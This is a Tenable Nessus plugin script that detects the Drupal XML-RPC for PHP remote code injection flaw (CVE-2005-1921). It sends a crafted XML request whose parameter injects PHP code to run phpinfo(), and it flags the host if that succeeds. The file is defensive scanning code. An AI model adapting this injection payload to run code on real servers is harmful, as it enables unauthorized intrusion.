#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(18640);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  script_xref(name:"OSVDB", value:"17793");

  script_name(english:"Drupal XML-RPC for PHP Remote Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
arbitrary PHP code injection attacks." );
 script_set_attribute(attribute:"description", value:
"The version of Drupal installed on the remote host allows attackers to
execute arbitrary PHP code due to a flaw in its bundled XML-RPC
library." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00088-07022005" );
 script_set_attribute(attribute:"see_also", value:"http://drupal.org/drupal-4.6.2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Drupal version 4.5.4 / 4.6.2 or later or remove the
'xmlrpc.php' script." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for XML-RPC for PHP remote code injection vulnerability in Drupal";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/drupal"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  r = http_send_recv3(port: port, method: "GET", item:string(dir, "/xmlrpc.php"));
  if (isnull(r)) exit(0);

  # If it does...
  if ("<methodResponse>" >< r[2]) {
    # Try to exploit it to run phpinfo().
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>test.method</methodName>",
        "<params>",
          "<param><value><name>','')); phpinfo();exit;/*</name></value></param>",
        "</params>",
      "</methodCall>"
    );

    r = http_send_recv3(port:port, method: "POST", item: strcat(dir, "/xmlrpc.php"), 
      version: 11, add_headers: make_array("Content-Type", "text/xml"), data: postdata);
    if (isnull(r)) exit(0);

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< r[2]) {
      security_hole(port);
      exit(0);
    }
  }
}
